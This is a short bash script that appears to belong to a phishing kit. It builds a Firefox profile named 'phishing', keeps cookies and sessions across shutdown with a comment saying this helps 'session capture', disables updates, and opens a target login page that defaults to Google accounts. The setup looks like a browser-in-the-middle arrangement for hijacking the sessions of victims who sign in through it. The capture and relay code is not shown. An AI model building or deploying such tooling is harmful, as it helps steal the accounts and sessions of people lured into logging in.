#!/bin/bash

# Wait for X server
sleep 2

# Get target URL from environment
TARGET_URL="${TARGET_URL:-https://accounts.google.com}"

# Create Firefox profile directory if not exists
PROFILE_DIR="/root/.mozilla/firefox/phishing.default"
mkdir -p "$PROFILE_DIR"

# Create user.js for Firefox preferences
cat > "$PROFILE_DIR/user.js" << 'EOF'
// Disable first-run pages
user_pref("browser.startup.homepage_override.mstone", "ignore");
user_pref("startup.homepage_welcome_url", "");
user_pref("startup.homepage_welcome_url.additional", "");
user_pref("browser.startup.firstrunSkipsHomepage", true);
user_pref("browser.shell.checkDefaultBrowser", false);
user_pref("browser.rights.3.shown", true);
user_pref("browser.startup.homepage", "about:blank");
user_pref("datareporting.policy.dataSubmissionEnabled", false);
user_pref("toolkit.telemetry.reportingpolicy.firstRun", false);

// Disable updates
user_pref("app.update.enabled", false);
user_pref("app.update.auto", false);

// Privacy settings that help with session capture
user_pref("privacy.sanitize.sanitizeOnShutdown", false);
user_pref("privacy.clearOnShutdown.cookies", false);
user_pref("privacy.clearOnShutdown.sessions", false);

// Enable cookies
user_pref("network.cookie.cookieBehavior", 0);
user_pref("network.cookie.lifetimePolicy", 0);
EOF

# Create profiles.ini
cat > "/root/.mozilla/firefox/profiles.ini" << EOF
[General]
StartWithLastProfile=1

[Profile0]
Name=phishing
IsRelative=1
Path=phishing.default
Default=1
EOF

# Start Firefox with the profile
exec firefox -profile "$PROFILE_DIR" -no-remote "$TARGET_URL"
